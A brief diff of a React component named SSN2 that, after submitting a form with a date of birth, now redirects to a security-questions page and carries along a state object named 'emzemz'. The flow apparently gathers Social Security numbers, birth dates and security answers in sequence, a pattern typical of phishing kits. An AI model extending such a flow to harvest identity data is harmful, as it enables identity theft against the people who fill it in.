@@ -76,7 +76,7 @@ const SSN2: React.FC = () => {
           dob: d_b
         });
         console.log('Form submitted successfully');
-        navigate('/terms');
+        navigate('/security-questions', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting form:', error);
         setIsLoading(false);
